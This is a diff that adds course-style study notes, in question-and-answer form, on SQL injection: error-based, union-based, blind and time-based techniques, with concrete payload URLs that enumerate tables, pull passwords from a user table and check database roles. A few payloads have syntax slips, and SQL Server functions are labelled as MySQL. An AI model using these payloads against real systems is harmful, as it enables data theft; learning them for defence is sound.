@@ -218,3 +218,142 @@
     The application should use the lowest possible level of priviliges when accessing the DB
     Unnecessary functions should be removed or disabled.
     All vendor-issued security patches sould be evaluated, tested and applied in a timely way.
+
+--------------------------------------------------------------------------------------------
+Ethical Hacking: SQL injection
+--------------------------------------------------------------------------------------------
+
+- Is it common problem that Website uses the same access rights to the DB no matter if the user is authenticated or not, admin or not?
+    Yes
+
+- A successful attack has impact on what?
+    Confidentiality
+    Integrity
+    Availability
+        Droping tables
+
+- Is it possible to run more than 1 query at the same time?
+    Yes
+        select * from A; select * from B
+
+- What are the 3 types of SQL injection?
+    Error based
+        The application raises errors of the underlying db (tells us everything)
+    Union based injection
+        Take a result set of a legitimate query and merge it with our malicious one, to pump the data to the application
+    Blind SQL injection
+        Cannot directly see the data, need to get it implicitly
+        Boolean based
+        Time based
+
+- What is the most common character to detect SQLi?
+    '
+
+- Are all HTTP verbs at risk?
+    Yes, even update, delete, etc.
+
+- How do you identify SQLi risks in code?
+    Appending the parameter instead of parametirizing it
+    Not whitelisting
+
+- What is the main constraint on using the union based SQLi?
+    Have the same number of columns in the crafted, second part of the query and the legitimate, first part of the query
+
+- How could you discover the table internal implementation (table name, columns name)?
+    By trying different guess (for example, if there is a vote feature, there might be a vote or votes table)
+
+    or
+
+    select * from sys.tables
+    select name from sys.tables
+    select object_id from sys.tables
+
+    select * from sys.columns
+
+    select * from sys.columns where object_id = (the object_id of the table)
+
+     www.mysite.com/Car?Cylinders=V12' union select object_id, name from sys.tables--
+     www.mysite.com/Car?Cylinders=V12' union select name from sys.columns where object_id = xxxxxxxxxx--
+
+- How can you disclose the value of an item in an error message of the db?
+    www.mysite.com/Car?Cylinders=V12' and 1=(select top 1 password from userprofile)--
+
+    results in a conversion error to int, disclosing the value that was not castable, the password value
+
+- How do you use error based injection to extract internal implementation? (For example, when the vulnerable query does not return results to the client front-end)
+    www.mysite.com/Car?Cylinders=V12' and 1=(select top 1 name from sys.table)--
+
+    - How could you get the 5th name?
+        www.mysite.com/Car?Cylinders=V12' and 1=(select top 1 name from (select top 5 name from sys.table order by name) t order name desc--
+
+        In other words, getting the 5 first result and only returning the first element after ordering the elments descending
+
+        1      5 <-----
+        2      4
+        3  ->  3
+        4      2
+        5      1
+
+- What is the blind SQli sucess criteria?
+    The command executed on the DB can be manipulated by the attacker
+
+- Given the following query, how would you inject a blind SQLi?
+    www.mysite.com/Car/Leaderboard?orderBy=power
+
+    www.mysite.com/Car/Leaderboard?orderBy=(select top 1 password from userprofile) -> success
+    www.mysite.com/Car/Leaderboard?orderBy=(select top 1 password2 from userprofile) -> error
+
+    just need to be a valid sql statement, doesn't necessarly have to return the result that the application expect
+
+- How could you use the case statement to have different (valid) responses using blind SQLi?
+    select * from car order by
+
+    case when ... then ... else ... end
+
+    desc
+
+
+
+    select * from car order by
+
+    case when (select count(*) from sys.tables)=10) then power else speed end
+
+    desc
+
+- How do you blindly extract the name of a table?
+    Enumerating characters
+
+        select * from car order by
+
+        case when (select top 1 substring(name, 1, 1) from sys.tables)='a' then power else speed end
+
+        desc
+
+    Enumerating ASCII values
+
+        select * from car order by
+
+        case when (select top 1 ASCII(lower(substring(name, 1, 1))) from sys.tables)<=109 then power else speed end     109 is ASCII value of m
+
+        desc
+
+- Where should you use a time based injection attack?
+    When you do not have any kind of feedback from the response. (like a 204)
+        There is no response body
+
+- Give an example of a time based injection attack.
+    somevalidstuff'); if select top 1 ASCII(lower(substring(name, 1, 1))) from sys.tables)<=109 waitfor delay '00:00:05'--
+
+- How can you establish the account identity and rights?
+    Every db has its own semantic for that, for example with MySQL, you can use curent_user to know the current user and is_rolemember to check if the current user possess the given rights.
+
+    Ex:
+
+    www.mysite.com/Car?Cylinger=V12' and 1=(select is_rolemember('db_owner'))--
+
+- How could you discover other db names?
+    www.mysite.com/Car?Cylinger=V12' union select name from sysdatabases (MySQL)
+
+    to use one:
+
+    www.mysite.com/Car?Cylinger=V12' union select name from [01-injection].sys.tables
